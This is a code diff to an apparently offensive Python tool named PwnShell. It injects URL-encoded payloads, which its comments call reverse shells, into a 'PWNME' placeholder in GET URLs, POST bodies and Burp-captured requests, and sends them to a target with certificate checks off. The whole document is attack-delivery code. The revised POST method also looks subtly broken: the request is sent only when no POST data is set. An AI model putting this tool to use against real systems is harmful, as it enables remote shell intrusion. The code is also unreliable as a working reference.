@@ -162,35 +162,31 @@ class PwnShell:
     #########################################################################################
     ###################################  POST METHOD #########################################
     def req_post(self, payload):
-        print(f'Trying: {payload}')
-        encoded_payload = self.get_url_encoded_payload(payload)
-        # payoad will be the revshells
-        url = self.domain.replace('PWNME', encoded_payload)
-        proxies = {'http': 'http://127.0.0.1:8080'}
-        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
-                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
-                   "Upgrade-Insecure-Requests": "1",
-                   'Content-Type': 'application/x-www-form-urlencoded'}  # Don't Change*
-        cookies = ''
-        if self.data:
-            data_parsed = self.data.replace(
-                "PWNME", encoded_payload)  # Don't change
-        else:
-            data_parsed = None
-        r = requests.post(url, headers=headers, data=data_parsed,
-                          cookies=cookies, verify=False)
+        if self.domain:
+            encoded_payload = self.get_url_encoded_payload(payload)
+            print(f'Trying: {payload}')
+            url = self.domain.replace('PWNME', encoded_payload)
+            proxies = {'http': 'http://127.0.0.1:8080'}
+            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close","Upgrade-Insecure-Requests": "1",'Content-Type': 'application/x-www-form-urlencoded'}  # Don't Change*
+            cookies = ''
+            if self.data:
+                data_parsed = self.data.replace("PWNME", encoded_payload)  # Don't chang
+            else:
+                data_parsed = None
+                r = requests.post(url, headers=headers, data=data_parsed,
+                    cookies=cookies, verify=False)
 
     #########################################################################################
     ###################################  GET METHOD #########################################
     def req_get(self, payload):
-        print(f'Trying: {payload}')
-        encoded_payload = self.get_url_encoded_payload(payload)
-        # payload will be the revshells
-        url = self.domain.replace('PWNME', self.payload)
-        proxies = {'http': 'http://127.0.0.1:8080'}
-        cookies = ''
-        r = requests.get(url, cookies=cookies, verify=False)
+        if self.domain:
+            print(f'Trying: {payload}')
+            encoded_payload = self.get_url_encoded_payload(payload)
+            # payload will be the revshells
+            url = self.domain.replace('PWNME', self.payload)
+            proxies = {'http': 'http://127.0.0.1:8080'}
+            cookies = ''
+            r = requests.get(url, cookies=cookies, verify=False)
 
     #########################################################################################
     ###################################  LOGIN   ############################################
@@ -205,14 +201,15 @@ class PwnShell:
         request, post_data = burpee.parse_request(self.file)  # Don;t change
         for r in request:
             if request[r] == "PWNME":
-                request[r] = request[r].replace("PWNME", 'PAYLOAD')  # THE PAYLOAD
+                request[r] = request[r].replace("PWNME", encoded_payload)  # THE PAYLOAD
             if r == "Host":
-                url = 'https://'+ request[r] + burpee.get_method_path(self.file)  #CONCATE WITH PATH
+                url = 'http://'+ request[r] + burpee.get_method_path(self.file)  #CONCATE WITH PATH
                 print(url)
         if post_data:
-            post_data = post_data.replace("PWNME", 'PAYLOAD')
+            post_data = post_data.replace("PWNME", encoded_payload)
             req =requests.post(url,headers=request,data=post_data,verify=False)
             print(req.status_code)
+            print()
         else:
             req = requests.get(url,headers=request,verify=False)
             print(req.status_code)
